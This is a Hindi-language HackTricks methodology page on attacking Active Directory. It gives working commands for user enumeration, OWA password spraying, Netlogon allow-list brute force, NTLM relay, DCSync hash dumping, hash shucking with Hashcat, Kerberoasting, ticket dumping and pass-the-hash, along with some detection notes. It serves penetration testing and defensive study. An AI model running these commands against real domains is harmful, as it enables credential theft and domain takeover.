# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** एक आधारभूत technology के रूप में कार्य करता है, जो **network administrators** को network के भीतर **domains**, **users**, और **objects** को कुशलतापूर्वक create और manage करने में सक्षम बनाता है। इसे scale करने के लिए बनाया गया है, जिससे बड़ी संख्या में users को manage करने योग्य **groups** और **subgroups** में व्यवस्थित किया जा सके, साथ ही विभिन्न स्तरों पर **access rights** को नियंत्रित किया जा सके।

**Active Directory** की structure तीन primary layers से बनी होती है: **domains**, **trees**, और **forests**। एक **domain** में ऐसे objects का collection होता है, जैसे **users** या **devices**, जो एक common database share करते हैं। **Trees** ऐसे domains के groups होते हैं जो एक shared structure से जुड़े होते हैं, और एक **forest** कई trees का collection होता है, जो **trust relationships** के माध्यम से आपस में जुड़े रहते हैं और organizational structure की highest layer बनाते हैं। इनमें से प्रत्येक level पर specific **access** और **communication rights** निर्धारित किए जा सकते हैं।

**Active Directory** में प्रमुख concepts शामिल हैं:

1. **Directory** – Active Directory objects से संबंधित सभी information को रखता है।
2. **Object** – directory के भीतर entities को दर्शाता है, जिनमें **users**, **groups**, या **shared folders** शामिल हैं।
3. **Domain** – directory objects के लिए एक container के रूप में कार्य करता है। एक **forest** के भीतर कई domains मौजूद हो सकते हैं, और प्रत्येक domain अपने objects का collection maintain करता है।
4. **Tree** – ऐसे domains का grouping जो एक common root domain share करते हैं।
5. **Forest** – Active Directory के organizational structure का highest level, जो कई trees से बना होता है और उनके बीच **trust relationships** होती हैं।

**Active Directory Domain Services (AD DS)** में centralized management और network के भीतर communication के लिए महत्वपूर्ण कई services शामिल हैं। इन services में शामिल हैं:

1. **Domain Services** – data storage को centralize करती हैं और **users** तथा **domains** के बीच interactions manage करती हैं, जिनमें **authentication** और **search** functionalities शामिल हैं।
2. **Certificate Services** – secure **digital certificates** के creation, distribution और management की निगरानी करती हैं।
3. **Lightweight Directory Services** – **LDAP protocol** के माध्यम से directory-enabled applications को support करती हैं।
4. **Directory Federation Services** – एक ही session में कई web applications के across users को authenticate करने के लिए **single-sign-on** capabilities प्रदान करती हैं।
5. **Rights Management** – unauthorized distribution और use को regulate करके copyright material की सुरक्षा में सहायता करती है।
6. **DNS Service** – **domain names** के resolution के लिए महत्वपूर्ण है।

अधिक detailed explanation के लिए देखें: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

AD पर **attack** करने का तरीका सीखने के लिए आपको **Kerberos authentication process** को वास्तव में अच्छी तरह **समझना** आवश्यक है।\
[**यदि आपको अभी भी यह नहीं पता कि यह कैसे काम करता है, तो यह page पढ़ें।**](kerberos-authentication.md)

## Cheat Sheet

AD पर enumerate/exploit करने के लिए आप कौन-से commands चला सकते हैं, इसका quick view पाने के लिए [https://wadcoms.github.io/](https://wadcoms.github.io) पर जा सकते हैं।

> [!WARNING]
> Kerberos communication के लिए सामान्यतः **fully qualified domain name (FQDN)** आवश्यक होता है, ताकि client सही SPN के लिए ticket प्राप्त कर सके। किसी machine को IP address के माध्यम से access करने पर सामान्यतः Kerberos के बजाय NTLM का fallback होता है।

## Recon Active Directory (No creds/sessions)

यदि आपके पास किसी AD environment का access है, लेकिन कोई credentials/sessions नहीं हैं, तो आप:

- **Pentest the network:**
- Network को scan करें, machines और open ports खोजें, और उनमें **exploit vulnerabilities** या **extract credentials** करने का प्रयास करें (उदाहरण के लिए, [printers can be very interesting targets](ad-information-in-printers.md))।
- DNS को enumerate करने से domain के भीतर web, printers, shares, vpn, media आदि जैसे key servers के बारे में information मिल सकती है।
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- ऐसा करने के तरीके के बारे में अधिक information पाने के लिए General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें।
- **Check for null and Guest access on smb services** (यह modern Windows versions पर काम नहीं करेगा):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB server को enumerate करने के तरीके पर अधिक detailed guide यहां मिल सकती है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP को enumerate करने के तरीके पर अधिक detailed guide यहां मिल सकती है ( **anonymous access** पर **विशेष ध्यान** दें):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- [**Responder के साथ services को impersonate करके**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credentials gather करें।
- [**relay attack का दुरुपयोग करके**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host access करें।
- [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) को **exposing** करके credentials gather करें।
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Internal documents, social media, services (मुख्यतः web) से domain environments के भीतर और publicly available sources से usernames/names extract करें।
- यदि आपको company workers के complete names मिलते हैं, तो आप विभिन्न AD **username conventions (**[**इसे पढ़ें**](https://activedirectorypro.com/active-directory-user-naming-convention/)) आजमा सकते हैं। सबसे common conventions हैं: _NameSurname_, _Name.Surname_, _NamSur_ (प्रत्येक के 3letters), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123)।
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) और [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages देखें।
- **Kerbrute enum**: जब **invalid username is requested**, server _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos error** code का उपयोग करके respond करता है, जिससे हम निर्धारित कर सकते हैं कि username invalid था। **Valid usernames** या तो AS-REP response में **TGT** देंगे या _KRB5KDC_ERR_PREAUTH_REQUIRED_ error देंगे, जो दर्शाता है कि user को pre-authentication perform करना आवश्यक है।
- **No Authentication against MS-NRPC**: domain controllers पर MS-NRPC (Netlogon) interface के विरुद्ध auth-level = 1 (No authentication) का उपयोग करना। यह method MS-NRPC interface से bind करने के बाद `DsrGetDcNameEx2` function को call करती है, ताकि बिना किसी credentials के यह check किया जा सके कि user या computer मौजूद है या नहीं। [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool इस प्रकार के enumeration को implement करता है। Research [यहां](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> मिल सकती है।
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

यदि आपको network में इनमें से कोई server मिलता है, तो आप इसके विरुद्ध **user enumeration** भी कर सकते हैं। उदाहरण के लिए, आप tool [**MailSniper**](https://github.com/dafthack/MailSniper) का उपयोग कर सकते हैं:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> आप [**इस github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) और इस repo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) में usernames की सूचियां पा सकते हैं।
>
> हालांकि, आपके पास recon step से **company में काम करने वाले लोगों के नाम** होने चाहिए, जिसे आपने इससे पहले perform किया होगा। नाम और surname के साथ, संभावित valid usernames generate करने के लिए आप [**namemash.py**](https://gist.github.com/superkojiman/11076951) script का उपयोग कर सकते हैं।

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

DC पर **Zerologon** patch किए जाने के बाद भी, explicitly allow-listed accounts **legacy/vulnerable Netlogon secure-channel behavior** के संपर्क में आ सकते हैं। जोखिमपूर्ण configuration GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** या matching registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** है।

यह value एक **SDDL security descriptor** है ([Security Descriptors](security-descriptors.md) देखें)। DACL में relevant ACE दिया गया कोई भी account या group target किया जा सकता है। उदाहरण के लिए, `O:BAG:BAD:(A;;RC;;;WD)` प्रभावी रूप से **Everyone** को allow-list करता है।

Practical operator workflow:

1. **Allow-listed principals की पहचान करें**, इसके लिए **SYSVOL/GPO** और **live DC registry**, दोनों की जांच करें।
2. SDDL में मिले **SIDs को real AD users/computers में resolve करें** और **DC machine accounts**, **trust accounts** तथा अन्य privileged machines को प्राथमिकता दें।
3. Allow-listed account के रूप में बार-बार **MS-NRPC / Netlogon authentication** का प्रयास करें।
4. सफल guess के बाद, target account का password reset करने के लिए **Netlogon password-setting** का abuse करें (public PoC इसे empty string पर सेट करता है)।<sup>[[9]](#references)[[10]](#references)</sup>

Public artifact से quick triage / lab examples:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- **scanner** उपयोगी है क्योंकि effective allow-list **SYSVOL**, **registry**, या दोनों में मौजूद हो सकती है।
- exploit path स्वयं महत्वपूर्ण है क्योंकि vulnerable account की पहचान हो जाने के बाद इसके लिए **Domain Admin privileges** की आवश्यकता **नहीं होती**।
- `DC$` जैसे **Domain Controller machine account** को compromise करना विशेष रूप से खतरनाक है, क्योंकि उसका password reset करने से सीधे व्यापक **AD takeover** paths सक्षम हो सकते हैं।
- **Brute-force feasibility** mode पर निर्भर करती है: public artifact में meet-in-the-middle approach, किसी अन्य computer account के उपलब्ध होने पर **24-bit** brute force, और धीमे **32-bit** variants का वर्णन है।

Detection / hardening notes:

- allow-list policy का audit करें और temporary, स्पष्ट रूप से आवश्यक compatibility exceptions के अलावा सब कुछ हटा दें।
- DC **System** events **5827/5828/5829/5830/5831** को monitor करें, ताकि vulnerable Netlogon connections के deny होने, discover होने, या policy द्वारा explicitly allow किए जाने का पता चल सके।
- `VulnerableChannelAllowList` में मौजूद accounts को **high-risk** मानें, जब तक legacy dependency हटा नहीं दी जाती।

### एक या कई usernames जानना

ठीक है, आपको पहले से पता है कि आपके पास एक valid username है, लेकिन कोई password नहीं है... तब यह आज़माएँ:

- [**ASREPRoast**](asreproast.md): यदि किसी user के पास _DONT_REQ_PREAUTH_ attribute **नहीं है**, तो आप उस user के लिए **AS_REP message request** कर सकते हैं, जिसमें user के password से derived किसी value द्वारा encrypted data होगा।
- [**Password Spraying**](password-spraying.md): खोजे गए users में से प्रत्येक के साथ सबसे **common passwords** आज़माएँ; हो सकता है कोई user कमजोर password का उपयोग कर रहा हो (password policy का ध्यान रखें!)।
- ध्यान दें कि users के mail servers तक access प्राप्त करने के लिए आप **OWA servers पर spray** भी कर सकते हैं।


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

आप **network** के कुछ protocols को **poisoning** करके crack करने योग्य challenge **hashes** **obtain** कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration से usernames, email identifiers और naming patterns, candidate hosts तथा वे services प्राप्त होती हैं जिन्हें authentication के लिए coerce किया जा सकता है। इस context का उपयोग viable NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) और AD environment में संभावित paths की पहचान करने के लिए करें।

### NetExec workspace-driven recon & relay posture checks

- प्रत्येक engagement के लिए AD recon state बनाए रखने हेतु **`nxcdb` workspaces** का उपयोग करें: `workspace create <name>` `~/.nxc/workspaces/<name>` के अंतर्गत per-protocol SQLite DBs (smb/mssql/winrm/ldap/etc) बनाता है। `proto smb|mssql|winrm` से views बदलें और `creds` से एकत्र किए गए secrets की सूची बनाएँ। काम पूरा होने पर sensitive data को manually purge करें: `rm -rf ~/.nxc/workspaces/<name>`।<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** से quick subnet discovery करने पर **domain**, **OS build**, **SMB signing requirements**, और **Null Auth** दिखाई देते हैं। `(signing:False)` दिखाने वाले members **relay-prone** होते हैं, जबकि DCs में अक्सर signing आवश्यक होता है।
- targeting को आसान बनाने के लिए NetExec output से सीधे **/etc/hosts में hostnames generate** करें:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- जब **SMB relay to the DC is blocked** by signing, तब भी **LDAP** posture की जाँच करें: `netexec ldap <dc>` `(signing:None)` / weak channel binding को उजागर करता है। SMB signing required लेकिन LDAP signing disabled वाला DC, **SPN-less RBCD** जैसे abuses के लिए एक viable **relay-to-LDAP** target बना रहता है।

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs कभी-कभी **masked admin passwords को HTML में embed** करते हैं। source/devtools देखने पर cleartext प्रकट हो सकता है (जैसे, `<input value="<password>">`), जिससे scan/print repositories तक Basic-auth access मिलता है।
- Retrieved print jobs में per-user passwords वाले **plaintext onboarding docs** हो सकते हैं। Testing के दौरान pairings को aligned रखें:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### NTLM Creds चुराना

यदि आप **null या guest user** के साथ **अन्य PCs या shares को access** कर सकते हैं, तो आप ऐसी **files रख** सकते हैं (जैसे SCF file) जिन्हें किसी तरह access किए जाने पर वे आपके विरुद्ध **NTLM authentication को trigger करें**, जिससे आप **NTLM challenge को steal** करके उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking और NT-Candidate Attacks

**Hash shucking** आपके पास पहले से मौजूद प्रत्येक NT hash को अन्य धीमे formats के लिए candidate password मानता है, जिनका key material सीधे NT hash से derive होता है। Kerberos RC4 tickets, NetNTLM challenges या cached credentials में लंबे passphrases को brute-force करने के बजाय, आप NT hashes को Hashcat के NT-candidate modes में feed करते हैं और plaintext जाने बिना password reuse को validate करने देते हैं। यह domain compromise के बाद विशेष रूप से प्रभावी होता है, जब आप हजारों current और historical NT hashes collect कर सकते हैं।<sup>[[5]](#references)</sup>

इन स्थितियों में shucking का उपयोग करें:

- आपके पास DCSync, SAM/SECURITY dumps या credential vaults से प्राप्त NT corpus है और आपको अन्य domains/forests में reuse test करना है।
- आप RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses या DCC/DCC2 blobs capture करते हैं।
- आप लंबे, uncrackable passphrases के reuse को जल्दी prove करना चाहते हैं और तुरंत Pass-the-Hash के माध्यम से pivot करना चाहते हैं।

यह technique उन encryption types के विरुद्ध काम **नहीं करती** जिनकी keys NT hash नहीं होतीं (जैसे Kerberos etype 17/18 AES)। यदि domain केवल AES enforce करता है, तो आपको regular password modes पर वापस जाना होगा।

#### NT hash corpus बनाना

- **DCSync/NTDS** – history के साथ `secretsdump.py` का उपयोग करके NT hashes का सबसे बड़ा संभव set (और उनके previous values) प्राप्त करें:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries candidate pool को काफी बढ़ा देती हैं, क्योंकि Microsoft प्रत्येक account के लिए अधिकतम 24 previous hashes store कर सकता है। NTDS secrets collect करने के अन्य तरीकों के लिए देखें:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (या Mimikatz `lsadump::sam /patch`) local SAM/SECURITY data और cached domain logons (DCC/DCC2) extract करता है। इन hashes को deduplicate करके उसी `nt_candidates.txt` list में append करें।
- **Metadata track करें** – प्रत्येक hash से संबंधित username/domain को रखें (भले ही wordlist में केवल hex हो)। जब Hashcat winning candidate print करता है, तो matching hashes तुरंत बताते हैं कि कौन-सा principal password reuse कर रहा है।
- उसी forest या trusted forest से प्राप्त candidates को प्राथमिकता दें; इससे shucking के दौरान overlap की संभावना अधिकतम होती है।

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **raw 32-hex NT hashes के रूप में ही रहने चाहिए**। Rule engines disable करें (`-r` नहीं, hybrid modes नहीं), क्योंकि mangling candidate key material को corrupt कर देती है।
- ये modes अपने-आप में तेज नहीं हैं, लेकिन NTLM keyspace (~30,000 MH/s on an M3 Max), Kerberos RC4 (~300 MH/s) से लगभग 100× तेज है। Curated NT list को test करना slow format में पूरे password space को explore करने से काफी सस्ता है।
- हमेशा **latest Hashcat build** चलाएं (`git clone https://github.com/hashcat/hashcat && make install`), क्योंकि modes 31500/31600/35300/35400 हाल ही में ship हुए हैं।<sup>[[7]](#references)</sup>
- वर्तमान में AS-REQ Pre-Auth के लिए कोई NT mode नहीं है, और AES etypes (19600/19700) के लिए plaintext password आवश्यक है, क्योंकि उनकी keys raw NT hashes से नहीं बल्कि UTF-16LE passwords से PBKDF2 के माध्यम से derive होती हैं।

#### Example – Kerberoast RC4 (mode 35300)

1. Low-privileged user के साथ target SPN के लिए RC4 TGS capture करें (विवरण के लिए Kerberoast page देखें):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. अपनी NT list के साथ ticket को shuck करें:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat प्रत्येक NT candidate से RC4 key derive करता है और `$krb5tgs$23$...` blob को validate करता है। Match यह confirm करता है कि service account आपके existing NT hashes में से किसी एक का उपयोग कर रहा है।

3. तुरंत PtH के माध्यम से pivot करें:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

यदि आवश्यक हो, तो बाद में `hashcat -m 1000 <matched_hash> wordlists/` के साथ plaintext recover कर सकते हैं।

#### Example – Cached credentials (mode 31600)

1. Compromised workstation से cached logons dump करें:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Interesting domain user की DCC2 line को `dcc2_highpriv.txt` में copy करके उसे shuck करें:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Successful match आपकी list में पहले से मौजूद NT hash देता है और prove करता है कि cached user password reuse कर रहा है। इसे सीधे PtH के लिए उपयोग करें (`nxc smb <dc_ip> -u highpriv -H <hash>`) या string recover करने के लिए fast NTLM mode में brute-force करें।

ठीक यही workflow NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर भी लागू होता है। Match identify होने के बाद आप relay, SMB/WMI/WinRM PtH launch कर सकते हैं या masks/rules के साथ NT hash को offline फिर से crack कर सकते हैं।



## Credentials/session के साथ Active Directory को Enumerate करना

इस phase के लिए आपके पास **किसी valid domain account की compromised credentials या session होनी चाहिए।** यदि आपके पास valid credentials या domain user के रूप में shell है, तो **याद रखें कि पहले दिए गए options अभी भी अन्य users को compromise करने के लिए उपलब्ध हैं**।

Authenticated enumeration शुरू करने से पहले **Kerberos double-hop problem** को समझें।


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account को compromise करना **domain का assessment करने की दिशा में एक major step** है, क्योंकि इससे authenticated **Active Directory enumeration** संभव होती है:

[**ASREPRoast**](asreproast.md) के संबंध में अब आप प्रत्येक संभावित vulnerable user को खोज सकते हैं, और [**Password Spraying**](password-spraying.md) के संबंध में आपको **सभी usernames की list** मिल सकती है तथा compromised account का password, empty passwords और नए promising passwords try कर सकते हैं।

- आप [**basic recon करने के लिए CMD का उपयोग**](../basic-cmd-for-pentesters.md#domain-info) कर सकते हैं
- आप [**recon के लिए powershell**](../basic-powershell-for-pentesters/index.html) का भी उपयोग कर सकते हैं, जो अधिक stealthy होगा
- अधिक detailed information extract करने के लिए आप [**powerview का उपयोग**](../basic-powershell-for-pentesters/powerview.md) भी कर सकते हैं
- Active directory में recon के लिए एक और amazing tool [**BloodHound**](bloodhound.md) है। यह **बहुत stealthy नहीं है** (आपके उपयोग किए गए collection methods पर निर्भर करता है), लेकिन **यदि आपको इसकी परवाह नहीं है**, तो इसे अवश्य आजमाएं। देखें कि users RDP कहां कर सकते हैं, अन्य groups तक path खोजें, आदि।
- **अन्य automated AD enumeration tools हैं:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD के DNS records**](ad-dns-records.md), क्योंकि इनमें interesting information हो सकती है।
- Directory enumerate करने के लिए आप **SysInternal** Suite के **AdExplorer.exe** नामक **GUI वाले tool** का उपयोग कर सकते हैं।
- आप LDAP database में credentials खोजने के लिए **ldapsearch** का उपयोग कर सकते हैं, fields _userPassword_ और _unixUserPassword_ में, या _Description_ में भी। अन्य methods के लिए [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) देखें।
- यदि आप **Linux** का उपयोग कर रहे हैं, तो [**pywerview**](https://github.com/the-useless-one/pywerview) के माध्यम से भी domain enumerate कर सकते हैं।
- आप automated tools भी try कर सकते हैं:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **सभी domain users को extract करना**

Windows से सभी domain usernames प्राप्त करना बहुत आसान है (`net user /domain`, `Get-DomainUser` या `wmic useraccount get name,sid`)। Linux में आप इसका उपयोग कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` या `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration section छोटा दिखता हो, फिर भी यह पूरे process का सबसे important part है। Links (मुख्य रूप से cmd, powershell, powerview और BloodHound वाले) access करें, domain enumerate करना सीखें और तब तक practice करें जब तक आप comfortable महसूस न करें। Assessment के दौरान यह DA तक पहुंचने का रास्ता खोजने या यह तय करने का key moment होगा कि कुछ नहीं किया जा सकता।

### Kerberoast

Kerberoasting में user accounts से जुड़े services द्वारा उपयोग किए जाने वाले **TGS tickets** प्राप्त करना और उनकी encryption को crack करना शामिल है—यह encryption user passwords पर आधारित होती है—**offline**।

इसके बारे में अधिक जानकारी:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, आदि)

कुछ credentials प्राप्त करने के बाद आप check कर सकते हैं कि क्या आपको किसी **machine** का access है। इसके लिए आप अपने port scans के अनुसार अलग-अलग protocols के साथ कई servers से connect करने का प्रयास करने के लिए **CrackMapExec** का उपयोग कर सकते हैं।

### Local Privilege Escalation

यदि आपने regular domain user के रूप में credentials या session compromise किया है और domain की **किसी भी machine को access** कर सकते हैं, तो locally **privileges escalate करने और credentials collect करने** का path खोजें। Local administrator privileges आपको memory (LSASS) और local storage (SAM) से **अन्य users के hashes dump** करने की अनुमति दे सकते हैं।

इस book में [**Windows में local privilege escalation**](../windows-local-privilege-escalation/index.html) और एक [**checklist**](../checklist-windows-privilege-escalation.md) पर पूरा page है। साथ ही, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) का उपयोग करना न भूलें।

### Current Session Tickets

यह **बहुत unlikely** है कि आपको current user में ऐसे **tickets** मिलेंगे जो आपको unexpected resources को **access करने की permission दें**, लेकिन आप जांच सकते हैं:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Domain credentials या user session के साथ, NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) पर दोबारा विचार करें: authenticated enumeration और coercion techniques उन relay paths को उजागर कर सकती हैं जो unauthenticated reconnaissance के दौरान उपलब्ध नहीं थे।

### Computer Shares में Creds की तलाश | SMB Shares

अब जब आपके पास कुछ basic credentials हैं, तो आपको जांच करनी चाहिए कि क्या आप **AD के अंदर shared की जा रही** कोई **interesting files ढूंढ** सकते हैं। आप यह manually कर सकते हैं, लेकिन यह बहुत उबाऊ और repetitive task है (और यदि आपको सैकड़ों docs मिलें जिन्हें check करना हो, तो और भी अधिक)।

[**उन tools के बारे में जानने के लिए इस link को follow करें जिनका आप उपयोग कर सकते हैं।**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

यदि आप **अन्य PCs या shares को access** कर सकते हैं, तो आप **files place** कर सकते हैं (जैसे SCF file), जिन्हें यदि किसी तरह access किया गया, तो वे आपके विरुद्ध **NTLM authentication को t**rigger करेंगी**, जिससे आप **NTLM challenge को steal** करके उसे crack कर सकते हैं:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

इस vulnerability ने किसी भी authenticated user को **domain controller को compromise** करने की अनुमति दी।


{{#ref}}
printnightmare.md
{{#endref}}

## Privileged credentials/session के साथ Active Directory पर Privilege escalation

**निम्न techniques के लिए एक regular domain user पर्याप्त नहीं है; इन attacks को perform करने के लिए आपको कुछ special privileges/credentials की आवश्यकता होगी।**

### Hash extraction

उम्मीद है कि आपने [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [locally escalating privileges](../windows-local-privilege-escalation/index.html) का उपयोग करके किसी **local admin** account को **compromise** कर लिया है।\
अब memory और locally मौजूद सभी hashes को dump करने का समय है।\
[**Hashes प्राप्त करने के विभिन्न तरीकों के बारे में इस page को पढ़ें।**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**एक बार आपके पास किसी user का hash हो**, तो आप उसका **impersonate** करने के लिए इसका उपयोग कर सकते हैं।\
आपको ऐसे **tool** का उपयोग करना होगा जो उस **hash का उपयोग करके NTLM authentication perform** करे, **या** आप एक नया **sessionlogon create** करके उस **hash को LSASS के अंदर inject** कर सकते हैं, ताकि जब भी कोई **NTLM authentication perform हो**, तो उस **hash का उपयोग किया जाए।** अंतिम option वही है जो mimikatz करता है।\
[**अधिक जानकारी के लिए यह page पढ़ें।**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

